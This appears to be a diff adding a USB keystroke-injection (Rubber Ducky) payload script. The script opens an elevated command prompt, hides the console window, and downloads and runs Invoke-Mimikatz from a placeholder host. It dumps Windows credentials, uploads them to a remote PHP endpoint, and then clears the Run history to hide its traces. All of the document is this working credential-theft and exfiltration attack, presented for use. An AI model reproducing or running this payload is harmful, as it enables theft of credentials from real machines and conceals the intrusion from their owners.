@@ -1,0 +1,32 @@
+REM Title: Invoke mimikatz and send creds to remote server
+REM 1000ms delay
+DELAY 1000
+
+REM Open an admin command prompt 
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Obfuscate the command prompt - not necessary
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+
+REM Download and execute Invoke Mimikatz then upload the results - update x.x
+REM replace 
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://x.x/im.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://x.x/rx.php', $output)"
+ENTER
+DELAY 15000
+
+REM Clear the Run history and exit
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+STRING exit
+ENTER
+
+
